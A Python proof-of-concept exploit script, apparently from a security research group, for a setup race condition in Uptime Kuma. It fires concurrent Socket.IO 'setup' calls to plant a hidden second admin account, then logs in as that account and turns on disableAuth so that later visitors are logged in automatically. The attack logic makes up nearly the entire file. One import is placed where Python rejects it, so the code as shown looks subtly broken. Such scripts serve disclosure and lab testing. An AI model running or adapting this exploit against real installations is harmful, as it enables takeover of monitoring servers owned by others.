#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: uptime-kuma-setup-toctou (High: 7.4)
#  Vendor: Uptime Kuma (Louis Lam)
#  Versions: Uptime Kuma <= 2.5.5
#  Impact: Account takeover (hidden second admin, then disableAuth)
#  Requires: unauthenticated SOCKET.IO setup
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "uptime-kuma-setup-toctou"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import json
import os
import subprocess
import sys
import threading
import time

import socketio

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18141").rstrip("/")
HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "uptime-kuma-setup-toctou")
SERVICE = os.environ.get("LAB_SERVICE", "kuma")

OPERATOR = "labadmin"
OPERATOR_PW = "LabAdmin-Passw0rd-OK"
ATTACKER = "UK-SETUP-TOCTOU-WITNESS"
ATTACKER_PW = "Attacker-Passw0rd-OK"
LATE_USER = "uk-late-setup"
LATE_PW = "LateSetup-Passw0rd-OK"

# N>=8 already-connected sockets. Mix operator and attacker only so id 1
# is one of those two (needed for disableAuth auto-login identity).
N_OPERATOR = 6
N_ATTACKER = 6
N_EXTRA = 0


class KumaSock:
    def __init__(self, url: str) -> None:
        self.url = url
        self.sio = socketio.Client(
            reconnection=False,
            logger=False,
            engineio_logger=False,
            handle_sigint=False,
        )
        self.login_required = threading.Event()
        self.auto_login = threading.Event()
        self.info = None
        self.monitor_list = None

        @self.sio.on("loginRequired")
        def _lr(*_a):
            self.login_required.set()

        @self.sio.on("autoLogin")
        def _al(*_a):
            self.auto_login.set()

        @self.sio.on("info")
        def _info(info):
            self.info = info

        @self.sio.on("setup")
        def _setup(*_a):
            pass

        @self.sio.on("monitorList")
        def _ml(data):
            self.monitor_list = data

    def connect(self, wait_login: bool = True) -> bool:
        # Do not set Origin: websocket-client already sends it from the URL.
        # A duplicate/mismatched Origin is 400 Forbidden (server.js origin check).
        self.sio.connect(
            self.url,
            transports=["websocket"],
            wait_timeout=30,
            socketio_path="socket.io",
        )
        if wait_login:
            self.login_required.wait(timeout=15)
        return bool(self.sio.connected)

    def emit_ack(self, event: str, data=None, timeout: float = 60):
        box: dict = {}
        ev = threading.Event()

        def cb(*args):
            box["args"] = args
            ev.set()

        self.sio.emit(event, data, callback=cb)
        if not ev.wait(timeout):
            return {"_timeout": True}
        args = box.get("args") or ()
        if not args:
            return None
        if len(args) == 1:
            return args[0]
        return list(args)

    def disconnect(self) -> None:
        try:
            if self.sio.connected:
                self.sio.disconnect()
        except Exception:
            pass


def compose_exec(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", SERVICE, *args],
        capture_output=True,
        text=True,
        timeout=30,
    )


def oracle_users() -> list[tuple[str, str]]:
    proc = compose_exec(
        "sqlite3",
        "-separator",
        "|",
        "/app/data/kuma.db",
        "SELECT id, username FROM user ORDER BY id;",
    )
    raw = (proc.stdout or "") + (proc.stderr or "")
    print(f"IOC oracle-sqlite rc={proc.returncode} stdout={proc.stdout!r} stderr={proc.stderr!r}")
    rows: list[tuple[str, str]] = []
    if proc.returncode != 0:
        return rows
    for line in raw.splitlines():
        line = line.strip()
        if not line or "|" not in line:
            continue
        uid, name = line.split("|", 1)
        rows.append((uid.strip(), name.strip()))
    return rows


def oracle_setting(key: str) -> str:
    proc = compose_exec(
        "sqlite3",
        "/app/data/kuma.db",
        f"SELECT value FROM setting WHERE key = '{key}';",
    )
    val = (proc.stdout or "").strip()
    print(f"IOC setting key={key} rc={proc.returncode} value={val!r}")
    return val


def race_usernames() -> list[tuple[str, str]]:
    users: list[tuple[str, str]] = []
    users.extend([(OPERATOR, OPERATOR_PW)] * N_OPERATOR)
    users.extend([(ATTACKER, ATTACKER_PW)] * N_ATTACKER)
    for i in range(2, 2 + N_EXTRA):
        users.append((f"ukrace{i}", f"UkRace{i}-Passw0rd-OK"))
    return users


def run_race(url: str) -> tuple[list, list[tuple[str, str]]]:
    users = race_usernames()
    n = len(users)
    print(f"IOC race-n={n} operator={OPERATOR} attacker={ATTACKER}")
    barrier = threading.Barrier(n)
    acks: list = [None] * n
    clients: list[KumaSock | None] = [None] * n
    errors: list = [None] * n

    def worker(idx: int, username: str, password: str) -> None:
        sock = None
        try:
            sock = KumaSock(url)
            clients[idx] = sock
            if not sock.connect():
                errors[idx] = "connect-failed"
                try:
                    barrier.abort()
                except Exception:
                    pass
                return
            try:
                barrier.wait(timeout=30)
            except threading.BrokenBarrierError:
                errors[idx] = "barrier-broken"
                return
            acks[idx] = sock.emit_ack("setup", (username, password), timeout=60)
        except Exception as exc:
            errors[idx] = f"{type(exc).__name__}:{exc}"
            try:
                barrier.abort()
            except Exception:
                pass
        finally:
            if sock is not None:
                sock.disconnect()

    threads = [
        threading.Thread(target=worker, args=(i, u, p), daemon=True)
        for i, (u, p) in enumerate(users)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=90)

    for i, (u, _p) in enumerate(users):
        print(f"IOC setup-ack i={i} user={u} ack={acks[i]!r} err={errors[i]!r}")

    time.sleep(0.5)
    rows = oracle_users()
    print(f"IOC user-rows {rows}")
    return acks, rows


def sequential_late_setup(url: str) -> dict | None:
    sock = KumaSock(url)
    try:
        sock.connect()
        ack = sock.emit_ack("setup", (LATE_USER, LATE_PW), timeout=30)
        print(f"IOC sequential-late-setup ack={ack!r}")
        return ack if isinstance(ack, dict) else {"raw": ack}
    finally:
        sock.disconnect()


def password_for(username: str) -> str | None:
    if username == OPERATOR:
        return OPERATOR_PW
    if username == ATTACKER:
        return ATTACKER_PW
    if username.startswith("ukrace"):
        suffix = username[len("ukrace") :]
        return f"UkRace{suffix}-Passw0rd-OK"
    return None


def bonus_disable_auth(url: str, rows: list[tuple[str, str]]) -> None:
    id1_name = next((name for uid, name in rows if str(uid) == "1"), None)
    attacker_id = next((uid for uid, name in rows if name == ATTACKER), None)
    print(f"IOC bonus-id1={id1_name!r} attacker-id={attacker_id!r}")

    sock = KumaSock(url)
    try:
        sock.connect()
        login_ack = sock.emit_ack(
            "login", {"username": ATTACKER, "password": ATTACKER_PW}, timeout=30
        )
        print(f"IOC attacker-login ack={login_ack!r}")
        if not isinstance(login_ack, dict) or not login_ack.get("ok"):
            print("IOC bonus-skip attacker login failed")
            return
        settings_ack = sock.emit_ack("getSettings", timeout=30)
        print(f"IOC getSettings ack={settings_ack!r}")
        if not isinstance(settings_ack, dict) or not settings_ack.get("ok"):
            print("IOC bonus-skip getSettings failed")
            return
        data = dict(settings_ack.get("data") or {})
        data["disableAuth"] = True
        set_ack = sock.emit_ack("setSettings", (data, ATTACKER_PW), timeout=30)
        print(f"IOC setSettings-disableAuth ack={set_ack!r}")
        if not isinstance(set_ack, dict) or not set_ack.get("ok"):
            print("IOC bonus-skip setSettings failed")
            return
    finally:
        sock.disconnect()

    time.sleep(0.3)
    disable_val = oracle_setting("disableAuth")

    recon = KumaSock(url)
    try:
        recon.connect(wait_login=False)
        got_auto = recon.auto_login.wait(timeout=20)
        got_login_req = recon.login_required.is_set()
        print(
            f"IOC reconnect autoLogin={got_auto} loginRequired={got_login_req} "
            f"disableAuth={disable_val}"
        )
        # Identity: prepare2FA doubleCheckPassword uses socket.userID (id 1).
        atk_pw_ack = recon.emit_ack("prepare2FA", ATTACKER_PW, timeout=30)
        print(f"IOC prepare2FA-attacker-pw ack={atk_pw_ack!r}")
        id1_pw = password_for(id1_name or "")
        id1_pw_ack = None
        if id1_pw and id1_pw != ATTACKER_PW:
            id1_pw_ack = recon.emit_ack("prepare2FA", id1_pw, timeout=30)
            print(f"IOC prepare2FA-id1-pw user={id1_name} ack={id1_pw_ack!r}")
        elif id1_name == ATTACKER:
            print("IOC prepare2FA-id1-pw skipped (id 1 is attacker; attacker-pw ack is the identity)")
            id1_pw_ack = atk_pw_ack
        uri = ""
        if isinstance(id1_pw_ack, dict):
            uri = str(id1_pw_ack.get("uri") or "")
        auto_is_id1 = got_auto and bool(id1_name) and id1_name in uri
        auto_not_attacker = ATTACKER not in uri
        auto_is_operator = auto_is_id1 and id1_name == OPERATOR and auto_not_attacker
        print(
            f"IOC bonus-autologin-identity operator={auto_is_operator} "
            f"id1={id1_name} auto_is_id1={auto_is_id1} not_attacker={auto_not_attacker} "
            f"uri={uri!r}"
        )
    finally:
        recon.disconnect()


def main() -> int:
    print(f"IOC base={BASE} project={COMPOSE_PROJECT} image=louislam/uptime-kuma:2.5.5")
    acks, rows = run_race(BASE)
    names = [name for _uid, name in rows]
    count = len(rows)
    witness = ATTACKER in names
    print(f"IOC race-count={count} witness={witness} names={names}")

    if count < 2 or not witness:
        print("RETRY uptime-kuma-setup-toctou")
        return 2

    late = sequential_late_setup(BASE)
    late_msg = str((late or {}).get("msg") or "")
    late_ok = (late or {}).get("ok")
    initialized = late_ok is False and "initialized" in late_msg.lower()
    print(f"IOC sequential-initialized={initialized} msg={late_msg!r}")
    if not initialized:
        print("FAIL uptime-kuma-setup-toctou")
        print("IOC reason=late setup was not rejected (not a closed race window)")
        return 1

    try:
        bonus_disable_auth(BASE, rows)
    except Exception as exc:
        print(f"IOC bonus-error {type(exc).__name__}:{exc}")

    print(f"IOC user-rows-final {oracle_users()}")
    print("SUCCESS uptime-kuma-setup-toctou")
    return 0


if __name__ == "__main__":
    sys.exit(main())

